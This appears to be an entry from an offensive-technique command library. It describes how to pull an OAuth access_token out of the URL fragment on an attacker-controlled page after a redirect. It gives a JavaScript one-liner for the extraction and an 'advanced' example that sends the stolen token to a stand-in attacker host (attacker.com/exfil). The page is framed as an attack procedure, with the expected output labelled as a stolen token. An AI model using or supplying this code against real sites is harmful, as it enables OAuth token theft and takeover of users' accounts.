---
data: >-
  let token = location.hash.match(/access_token=([^&]+)/)?.[1];
  console.log(token);
tags:
  - token-extraction
  - javascript
type: command
executor: javascript
platforms:
  - Web
id: 35884de2-cc3a-4520-ba5e-f5167143009f
created_at: '2025-12-14T17:24:35.736Z'
updated_at: '2025-12-14T17:24:35.736Z'
verified: false
validated: true
submitted: true
---
# extract-token-from-location-hash

## Command

```javascript
let token = location.hash.match(/access_token=([^&]+)/)?.[1]; console.log(token);
```

## Description

JavaScript command to extract the OAuth access_token from the URL fragment on the attacker's page after redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| location.hash | Browser URL fragment (e.g., #access_token=TOKEN) | Implicit |

## Examples

### Basic Usage

```javascript
console.log(location.hash);
```

### Advanced Usage

```javascript
fetch('https://attacker.com/exfil?token=' + location.hash.split('=')[1]);
```

## Expected Output

String: STOLEN_TOKEN or full '#access_token=STOLEN_TOKEN'.

## Related

- [[Related Procedure: Extract-OAuth-Token-from-URL-Hash]]
